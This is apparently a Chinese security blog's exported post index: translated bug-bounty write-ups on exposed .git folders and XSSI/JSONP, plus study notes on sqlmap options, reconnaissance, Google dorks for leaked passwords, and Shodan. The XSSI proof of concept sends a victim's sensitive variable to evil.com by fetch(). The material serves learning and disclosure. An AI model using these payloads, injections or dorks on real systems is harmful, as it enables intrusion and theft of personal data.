<li>如果有且公开的话，那么它将会递归下载子域名的整个git文件夹，并保存在一个文件夹中</li>
</ol>
<p>这就是我的所作所为，哈哈，你要做的是准备一个包含各种大、中、小型企业（有公开/私有赏金漏洞项目或src）的域名，然后扔到<code>git-domain.py</code>里~~</p>
<p><img src="https://miro.medium.com/max/1118/1*WwmCci5MDIo4pCogTxKfvw.png" alt="Git directory check on each subdomain of the main domain"></p>
<p><img src="https://miro.medium.com/max/1242/1*VvN7B7n27MFUDPbeR8vvZQ.png" alt="Git directory check on each subdomain of the main domain"></p>
<p>然后我就得到了一大堆git配置错误目录，其中包括印度最大电信服务提供商的，有些还有主站的源代码。</p>
<p><img src="https://miro.medium.com/max/1912/1*2lMqJ0GQU3KrAyCX9ZBFXQ.png" alt="Git directory files"></p>
<p><img src="https://miro.medium.com/max/1210/1*ZGmcsZ0S34jXhFGwxiBHfg.png" alt="Source code access"></p>
<h2 id="如何修复"><a href="#如何修复" class="headerlink" title="如何修复"></a>如何修复</h2><p>站长或者研发必须确保<code>.git</code>目录没有被设置为外部可见路径索引，并且使用服务器权限也不允许获取这些目录、子目录及其下所有文件。还有，<code>.gitignore</code>文件不应该被用于确认敏感文件是否被忽略或上传。大道至简，最佳修复方式就是拒绝<code>.git</code>文件夹的访问</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">DirectoryMatch</span> “^/<span class="attr">.</span>*/\<span class="attr">.git</span>/”&gt;</span></span><br><span class="line">Require all denied</span><br><span class="line"><span class="tag">&lt;/<span class="name">DirectoryMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="我的视角："><a href="#我的视角：" class="headerlink" title="我的视角："></a>我的视角：</h2><ol>
<li><p>这种问题我可以用<code>lijiejie</code>的<code>githack</code>跑一下，可是现在这种问题还多吗？这篇是18年10月的，这两天我再试试，扫扫edusrc</p>
</li>
<li><p>作者的思路也还容易理解和想到，把现有的工具合并、改造，关键还是要有对于特定场景的前瞻性思路才行</p>
</li>
</ol>
]]></content>
      <categories>
        <category>每日翻译</category>
      </categories>
      <tags>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全学习笔记(3)</title>
    <url>/2020/02/29/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h2><h3 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h3><ol>
<li><p>设置持久HTTP连接</p>
<p>将HTTP报文中设置Connection：Keep-Alive<a id="more"></a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--keep-alive </span><br><span class="line">-o # 可以开启所有性能优化参数</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置空连接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--null-connection # 为了检索没有body相应的内容</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置多线程</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--thread=10 # 默认1个，最大10个</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置预测输出</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--predict-output # 注意和thread不兼容</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><ol>
<li><p>设置指定测试参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-p # 指定具体探测参数</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># sqlmap -u "" -p "id,user-agent"</span></span></span><br><span class="line"></span><br><span class="line">--skip # 忽略探测具体参数 </span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># sqlmap -u "" -skip "user-agent,referer"</span></span></span><br><span class="line"></span><br><span class="line">--param-exclude # 忽略包含具体内容的参数</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># --param-exclude="token|session"</span></span></span><br><span class="line"></span><br><span class="line">--skip-static # 忽略非动态参数</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置URI注入位置</p>
<p>当注入点位于URI本身内部时，会出现一些特殊情况。除非手动指向uri路径，否则sqlmap不会对uri路径执行自动测试，必须在命令行中添加星号（*）来指定注入点。</p>
<p>例如：当使用Apache web服务器的mod_rewrite模块或其他类似技术时，这就显得特别有用了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u "http://target.com/param1/value1*/param2/value2/"</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置任意位置注入</p>
<p>与URI注入点类似，星号（*） （注意：这里也支持Havij样式%INJECT%）也可以用来指向GET、POST或HTTP头中的任意注入点。注入点可以通过在带有选项-u的GET参数值、带有选项-data的POST参数值、带有选项-H的HTTP头值、带有-H、–user-agent、–referer、–cookie的HTTP头值中指定，或者在带有选项-r的文件中加载的HTTP请求通用位置指定</p>
<p>反正应该是很多位置都能加了，多试试。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全学习笔记(2)</title>
    <url>/2020/02/29/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h2><ul>
<li>基于python2的一款sql注入，数据库测试工具</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-hh # 详细帮助信息</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h3 id="获取目标"><a href="#获取目标" class="headerlink" title="获取目标"></a>获取目标</h3><ol>
<li><p>直连数据库</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 服务型数据库（前提：知道数据库用户名、密码）</span></span><br><span class="line">DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME(Mysql, Oracle, MSSql, postgresql,etc)</span><br><span class="line"></span><br><span class="line">e.g.: python sqlmap.py -d <span class="string">"mysql://admin:admin@192.168.206.133:3306:/testdb"</span> -f --banner --dbs --users            </span><br><span class="line">            </span><br><span class="line"><span class="comment"># 文件型数据库（前提：知道数据库绝对路径）</span></span><br><span class="line">DBMS://DATABASE_FILEPATH(SQLite,Access, Firebird, etc)</span><br></pre></td></tr></table></figure>
</li>
<li><p>url探测</p>
</li>
</ol>
<p>sqlmap直接对单一url探测，采用-u或者–url</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">URL格式：http(s):targeturl[:port]/[...]</span><br><span class="line"></span><br><span class="line">比如：python sqlmap -u "http://192.168.0.206/sqli/Less-1/index.php/id=1" --banner</span><br><span class="line"></span><br><span class="line">sqlmap支持不同类型文件中读取目标进行sql注入探测</span><br><span class="line">1)-l 从burp proxy或webscarab proxy中读取http请求日志文件</span><br><span class="line">2)-x 从sitemap.xml站点地图文件中读取目标探测</span><br><span class="line">3)-m 从多行文本格式文件中读取多个目标，对多个目标进行探测</span><br><span class="line">4)-r 从文本文件中读取http请求作为sql注入探测目标</span><br><span class="line">5)-c 从配置文件sqlmap.conf中读取目标探测</span><br></pre></td></tr></table></figure>

<p>这里我们将bp的project option下loggin勾选上requests立即弹出框，我们自己设置保存地址</p>
<p><img src="/2020/02/29/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2/1.jpg" alt></p>
<ol start="3">
<li><p>google hack批量扫注入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-g 使用-g自动利用google获取指定Google hack的目标，然后利用交互向导模式进行sql注入探测</span><br><span class="line"></span><br><span class="line">e.g. python sqlmap.py -g "inrul:\".php?id=1\"" (好像普通设置http(s)_proxy不能连接上)</span><br><span class="line"></span><br><span class="line"> [CRITICAL] unable to connect to Google ('can't establish SSL connection')</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="设置请求参数"><a href="#设置请求参数" class="headerlink" title="设置请求参数"></a>设置请求参数</h3><ol>
<li><p>设置HTTP方法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--methed=你的METHOD # 某些场景下需要强制给定，--methed=PUT</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置POST提交参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--data="id=1" -f --banner --dbs --users</span><br><span class="line"><span class="meta">#</span><span class="bash"> --data直接转换为post方法，当然也可以使用--method=POST，-f是fingerprint</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## fingerprint: comment injection fingerprint: MySQL 5.5.47</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>设置参数分割符</p>
<p>某些情况下，sqlmap需要覆盖默认参数分割符（e.g. &amp;在GET和POST数据），才能正确分割和单独处理每个参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u "urL" --data="query=foobar;id=1" --param-del=";" -f --banner --dbs</span><br><span class="line"><span class="meta">#</span><span class="bash"> --params-del指明data中的变量分割符</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>设置cookie头</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--cookie</span><br><span class="line">--cookie-del</span><br><span class="line">--load-cookies</span><br><span class="line">--drop-set-cookie # 忽略即将到来的set-cookie头</span><br></pre></td></tr></table></figure>

<p>使用场景</p>
<ol>
<li>web app中有基于cookie验证过程</li>
<li>想利用cookie值上的sql注入</li>
</ol>
<p>使用过程：</p>
<ol>
<li>登录or浏览页面</li>
<li>打开代理截断or审计工具，复制cookie</li>
<li>在sqlmap中使用–cookie粘贴cookie</li>
</ol>
</li>
<li><p>设置User-Agent</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--user-agent="你的UA" # 字符串ua粘贴进去</span><br><span class="line">--random-agent # sqlmap随机ua</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#！ 注意：针对UA的值进行检测sql注入，需要设置--level 3</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>设置Host头</p>
<p>可以手动设置主机头，将对HTTP主机进行SQL注入检测，如果–level值设置为5，将对HTTP著机构进行全部探测</p>
</li>
<li><p>设置Referer头</p>
<p>没有显式设置，HTTP请求不会发送HTTP引用头，注意若–level为3或以上，将对HTTP引用头进行sql测试</p>
</li>
<li><p>设置额外HTTP头</p>
<p>通过设置–header，提供额外HTTP头。每个头必须用换行符分割，从配置ini文件中提供他们比较容易。可以查看sqlmap.conf</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u "url" -H "User-Agent:...\n" # 只能指定单个头</span><br><span class="line">等同于??</span><br><span class="line">--header="..."</span><br><span class="line"></span><br><span class="line">设置多个头</span><br><span class="line">python sqlmap.py -u "url" --headers="User-Agent:...\nCookie:...\n...."</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置HTTP协议认证</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">认证参数</span><br><span class="line">--auth-type</span><br><span class="line">	Basic Digest NTLM</span><br><span class="line">--auth-cred</span><br><span class="line">	username:password</span><br><span class="line">	</span><br><span class="line">e.g. python sqlmap.py -u "url" --auth-type Basic --auth-cred "user:passw"</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置HTTP代理</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">代理参数</span><br><span class="line">--proxy</span><br><span class="line">--proxy-cred</span><br><span class="line">--proxy-file</span><br><span class="line">--ignore-proxy</span><br><span class="line"></span><br><span class="line">其中</span><br><span class="line">--proxy用来设置HTTP代理服务器位置 </span><br><span class="line">格式为： --proxy http(s)://ip[:port]</span><br><span class="line"></span><br><span class="line">--proxy-cred用来设置HTTP代理服务器认证信息 格式为：--proxy-cred username:password</span><br><span class="line"></span><br><span class="line">--proxy-file用来设置多条代理在文件中</span><br><span class="line"></span><br><span class="line">--ignore--proxy访问本地不用代理（拗口讲法：希望忽略系统范围内HTTP(S)代理服务器设置来针对本地网络目标部分运行sqlmap时）</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置Tor隐藏网络</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--tor</span><br><span class="line">--tor-port</span><br><span class="line">--tor-type</span><br><span class="line">--check-tor</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 初次使用必须安装tor</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> kali中： apt install tor</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 开启服务：service tor start</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 状态：service tor status</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意要连接能够连接外网的vps或者别的代理</span></span><br><span class="line">e.g. python -u "url" --tor  --tor-type https --check-tor</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置延迟</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--delay 0.5 # 延迟0.5秒</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u "url" --delay 0.5 -f</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置超时</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--timeout 0.5 # 10.5秒超时</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置重置次数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--retries count # 设置对应重试次数，默认3次</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置随机化参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--randomize 参数名称</span><br><span class="line"></span><br><span class="line">e.g. python sqlmap.py -u "url" --randomize id --banner</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置日志过滤目标</p>
<p>可以指定有效的python正则表达式，用于过滤所需日志</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--scope</span><br><span class="line"><span class="meta">#</span><span class="bash"> e.g. python sqlmap.py -l burp.log --scope=<span class="string">"(www)?\.target\.(com|net|org)"</span> </span></span><br><span class="line">--skip-urlencode # 不进行url加密</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置忽略401</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--ignore-401 # 用来忽略未验证错误</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置HTTP协议私钥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--auth-file 文件名 # 应该提供一个PEM的key file私钥文件</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置安全模式</p>
<p>避免在多次请求失败后销毁会话，有时执行了一定量失败请求后web应用or检查技术会销毁会话，这可能发生在sqlmap检测阶段or利用盲注阶段</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--safe-url</span><br><span class="line">--safe-post</span><br><span class="line">--safe-req</span><br><span class="line">--safe-freq</span><br></pre></td></tr></table></figure>

<p>将访问预定义请求数量请求，而部队某个安全url执行任何注入</p>
</li>
<li><p>设置忽略URL编码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--skip-urlencode</span><br></pre></td></tr></table></figure>

<p>某些情况下服务器不遵循RFC标准，需要医院是非编码形式发送</p>
</li>
</ol>
<p>设置额外HTTP头</p>
<p>FIXIT</p>
<p> <a href="https://www.freebuf.com/sectool/42919.html" target="_blank" rel="noopener">1</a> <a href="https://blog.csdn.net/GVFDBDF/article/details/49150361" target="_blank" rel="noopener">2</a> <a href="https://www.csdn.net/gather_29/MtTaIgxsMDg2My1ibG9n.html" target="_blank" rel="noopener">3</a> </p>
<p><a href="https://blog.51cto.com/wt7315/1841241" target="_blank" rel="noopener">sqlmap注入总结</a></p>
]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全学习笔记(1)</title>
    <url>/2020/02/29/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><ol>
<li><h4 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h4><ul>
<li>在线网站</li>
<li>kali下whois<a id="more"></a></li>
</ul>
</li>
<li><p>备案信息</p>
<ul>
<li>在线网站</li>
</ul>
</li>
<li><p>cms指纹识别</p>
<ul>
<li>在线工具：云溪、<a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">在线cms指纹识别</a></li>
<li>大禹cms识别</li>
</ul>
</li>
<li><p>web敏感目录探测工具</p>
<ul>
<li>御剑</li>
<li>wwwscan</li>
<li>dirb命令行工具</li>
<li>dirbuster</li>
</ul>
</li>
<li><p>端口信息</p>
<ul>
<li>windows下<code>netstat</code></li>
<li>kali中使用<code>masscan</code>和<code>nmap</code>(单独挑出来学语法)</li>
<li>在线网站（e.g.站长之家）</li>
<li>攻击方法：不同端口不同攻击方式，使用baidu</li>
</ul>
</li>
<li><p>敏感信息</p>
<ul>
<li>Google hacking <GHDB></GHDB></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:</span><br><span class="line">inurl:</span><br><span class="line">intext:</span><br><span class="line">filetype(ext):</span><br><span class="line">intitle:</span><br><span class="line">link:网页链接</span><br><span class="line">info:网页信息</span><br><span class="line">e.g. inurl:?id&#x3D; ext:jsp &quot;hello&quot; (password|username|hello)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>HTTP响应</p>
<ul>
<li>浏览器审计工具、bp</li>
<li>python requests</li>
</ul>
</li>
<li><p>GitHub</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*** 代指 github</span><br><span class="line">site:*** smtp | *** smtp@qq.com</span><br><span class="line">site:*** sa password | root password | User ID&#x3D;&#39;sa&#39;;Password</span><br><span class="line">site:*** svn | svn username </span><br><span class="line">site:*** password | ftp ftppassword | 密码 | 内部</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>真实ip&lt;可扩展&gt;</p>
<ul>
<li><p>判断是否存在cdn（内容分发网络）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* 自己ping</span><br><span class="line">* 使用在线网站 各地ping、全球ping</span><br></pre></td></tr></table></figure>

<p>如果IP地址不同则存在cdn</p>
</li>
<li><p>绕过cdn</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* 内部邮箱源 收集到内部邮箱服务器IP地址</span><br><span class="line">* 网站phpinfo文件 phpinfo.php</span><br><span class="line">* 分站IP地址，查询子域名 CDN很贵，有可能分站不用CDN</span><br><span class="line">* 国外访问 https:&#x2F;&#x2F;asm.ca.com&#x2F;en&#x2F;ping.php</span><br><span class="line">* 查询域名解析记录 https:&#x2F;&#x2F;viewdns.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用IP地址对web地址访问，能访问则为真</p>
</li>
</ul>
</li>
</ol>
<h2 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h2><ol>
<li><p>语法和实战</p>
<ul>
<li>webcam</li>
<li>port:22</li>
<li>ip:</li>
<li>city:hangzhou</li>
</ul>
</li>
<li><p>命令行安装</p>
<ul>
<li><p>easyinstall 安装shodan</p>
</li>
<li><p>初始化shodan</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shodan init 你在官网上的激活码（挺长的~）</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动并查找具体服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shodan count apache</span><br><span class="line">shodan count tomcat</span><br><span class="line">shodan search microsoft iis 6.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取指定IP地址信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shodan host ip</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取自己账号信息&amp;自身ip（鸡肋？应该有不同应用场景）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shodan info </span><br><span class="line">shodan myip</span><br></pre></td></tr></table></figure>
</li>
<li><p>检查是否有蜜罐</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shodan honeyscore ip</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>python-shodan</p>
<ul>
<li>我们使用ipython，初始化api_key</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> shodan </span><br><span class="line">SHODAN_API_KEY = <span class="string">"your api key"</span></span><br><span class="line">api = shodan.Shodan(SHODAN_API_KEY)</span><br></pre></td></tr></table></figure>

<ul>
<li>python-shodan search方法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result = api.search(<span class="string">"apache"</span>)</span><br><span class="line">print(result[<span class="string">'total'</span>]) </span><br><span class="line"><span class="comment"># 具体查看https://developer/shodan.io/api</span></span><br></pre></td></tr></table></figure>

<ul>
<li>查询</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result = api.host(<span class="string">"59.110.244.199"</span>)</span><br><span class="line">print(result[<span class="string">'country_name'</span>])</span><br></pre></td></tr></table></figure>

<ul>
<li>查询脚本编写&lt;待扩展&gt;</li>
</ul>
</li>
</ol>
<h2 id="Git信息泄露"><a href="#Git信息泄露" class="headerlink" title="Git信息泄露"></a>Git信息泄露</h2><ol>
<li>原理：<ul>
<li>.git文件夹下文件，还原重建工程源代码</li>
<li>解析.git/index文件，找到工程中所有的：（文件名，文件sha1）</li>
<li>去.git/objects/文件夹下下载对应文件</li>
<li>zlib解压文件，按原始目录结构写入源代码（好好学git）</li>
</ul>
</li>
</ol>
<ol start="2">
<li>信息泄露利用<ul>
<li>githack（lijiejie）</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>毫不费力地挖到XSSI&amp;JSONP漏洞</title>
    <url>/2020/02/27/%E6%AF%AB%E4%B8%8D%E8%B4%B9%E5%8A%9B%E5%9C%B0%E6%8C%96%E5%88%B0XSSI-JSONP%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>原文链接：<a href="https://medium.com/bugbountywriteup/effortlessly-finding-cross-site-script-inclusion-xssi-jsonp-for-bug-bounty-38ae0b9e5c8a" target="_blank" rel="noopener">毫不费力地挖到XSSI/JSONP漏洞</a></p>
<p>漏洞难度：中</p>
<p>漏洞奖金：$800</p>
<p>漏洞类型：XSS</p>
<a id="more"></a>

<p>​    大家好哇！我最近在私有项目中上报了一个价值$800的XSSI（XSS包含）漏洞，于是我决定分享一下我在挖洞中遵循的方法论</p>
<p><img src="https://miro.medium.com/max/1553/1*4lJ1sLR4IluFm6eE4KV_jQ.png" alt></p>
<p>如果你还不太懂XSSI和JSONP，那么好好读读下面的文章：</p>
<p>XSSI：<a href="https://www.scip.ch/en/?labs.20160414" target="_blank" rel="noopener"><strong>https://www.scip.ch/en/?labs.20160414</strong></a></p>
<p>JSONP：<a href="https://www.sjoerdlangkemper.nl/2019/01/02/jsonp/" target="_blank" rel="noopener"><strong>https://www.sjoerdlangkemper.nl/2019/01/02/jsonp</strong></a></p>
<h2 id="我的方法论："><a href="#我的方法论：" class="headerlink" title="我的方法论："></a>我的方法论：</h2><ul>
<li>在爬取目标站点（手工或自动）之后，我先把Burp Suite中的MIME类型结果筛选出来，然后把response中的”script“类型敏感信息快速看一遍</li>
</ul>
<p><img src="https://miro.medium.com/max/1089/1*OgZGYuhITMyeFr7gjVxkEA.png" alt></p>
<ul>
<li><p>我找到了一个JS文件，它里面包含我刚才注册填写的所有信息，包括社保号，病历，银行卡信息，名字，电话号，住址等等</p>
</li>
<li><p>我马上扫了一眼这个JS的GET请求，再次确认它headers里没有CORS triggering（同源策略触发设置），就像：<code>Authorization,X-API-KEY,X-CSRF-TOKEN,X-whatever</code></p>
</li>
<li><p>到了这个阶段，如果它确实设定了同源策略，那么攻击就会失败，除非我也找到它的一个同源漏洞</p>
</li>
<li><p>在这种情况下，并不需要特殊的headers，所以我能在web页面上用一个标签把JS文件包含进来，同时把它发送到任意一个泄露大量身份认证信息的服务器</p>
</li>
<li><p>POC如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">"https://target.com/vuln.js"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script defer&gt;</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ var_name 是 vul.js 中的一个有敏感信息的变量</span></span><br><span class="line"><span class="regexp">console.log(var_name);</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 发送信息到攻击者的服务器上</span></span><br><span class="line"><span class="regexp">fetch("https:/</span><span class="regexp">/evil.com/</span>stealInfo?info=<span class="string">"+var_name);</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>你可以用一样的办法去找JSONP回调，比如添加参数 <code>callback=some_function, jsonp=...</code>  等等，可以在返回敏感信息的所有路径下做这样的测试</p>
</li>
</ul>
<h2 id="关键点："><a href="#关键点：" class="headerlink" title="关键点："></a>关键点：</h2><ul>
<li><p>有时候你需要多个参数去触发一个JSONP response。比如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//target.com?callback=test → no JSONP</span></span><br><span class="line">http:<span class="comment">//target.com?type=jsonp&amp;callback=test → returns JSONP</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>如果response中有<code>Content-Type: application/json</code>但是返回体中有<code>JSONP/javascript</code>，而且没有<code>X-Content-Type-Options: nosniff</code> ，我们依然可以利用漏洞</p>
</li>
<li><p>对于JSONP，即使在同一个网站，不同的回调参数可能作用在不同的地方。比如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">举个栗子:</span><br><span class="line">https:<span class="comment">//target.com/profile_info?callback=test→ no JSONP</span></span><br><span class="line">https:<span class="comment">//target.com/profile_info?jsonp=test→ returns JSONP</span></span><br><span class="line">但是，在此网站上的另一个路径中:</span><br><span class="line">https:<span class="comment">//target.com/account_info?jsonp=test→ no JSONP</span></span><br><span class="line">https:<span class="comment">//target.com/account_info?jsoncallback=test→ returns JSONP</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
]]></content>
      <categories>
        <category>每日翻译</category>
      </categories>
      <tags>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
</search>
